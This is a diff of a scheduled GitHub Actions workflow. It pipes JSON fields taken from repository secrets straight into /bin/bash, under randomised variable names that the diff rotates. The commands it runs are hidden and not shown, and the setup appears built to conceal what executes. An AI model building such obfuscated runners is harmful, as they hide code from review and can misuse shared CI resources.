@@ -3,7 +3,8 @@ name: zhaojinan7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
+    - cron: '53 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +13,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaojinan7890
         env:
-          lmq890: ${{ secrets.lmq890 }}
+          ux1608: ${{ secrets.ux1608 }}
         run: |
-          echo $lmq890 | jq -r .zldu513 | /bin/bash
-          echo $gyndl1845 | jq -r .jvqx62251 | /bin/bash
-          echo $bv68 | jq -r .akk174 | /bin/bash
-          echo $bbd22 | jq -r .ch12138 | /bin/bash
-          echo $imeb36 | jq -r .do0 | /bin/bash
-          echo $gfdo97 | jq -r .yok4254 | /bin/bash
-          echo $n4562 | jq -r .hgn090 | /bin/bash
-          echo $t8580 | jq -r .fiumq19966 | /bin/bash
-          echo $ieb2564 | jq -r .bkzq046 | /bin/bash
+          echo $ux1608 | jq -r .lxa27298 | /bin/bash
+          echo $sgwkl962 | jq -r .igab51 | /bin/bash
+          echo $ebayb9 | jq -r .k9 | /bin/bash
+          echo $uitzb0830 | jq -r .pa345 | /bin/bash
+          echo $z58392 | jq -r .tfsgs40823 | /bin/bash
+          echo $gw48840 | jq -r .nb3411 | /bin/bash
+          echo $gy5 | jq -r .uw76323 | /bin/bash
+          echo $p7 | jq -r .m24 | /bin/bash
+          echo $hy9 | jq -r .qpczy5 | /bin/bash
+          echo $kgzql7 | jq -r .qerm111 | /bin/bash
+          echo $t1264 | jq -r .nu72 | /bin/bash
+          echo $hfvhp75624 | jq -r .k2 | /bin/bash
+          echo $y008 | jq -r .u7832 | /bin/bash
+          echo $hag336 | jq -r .j4821 | /bin/bash
+          echo $l17 | jq -r .utcm2013 | /bin/bash
 
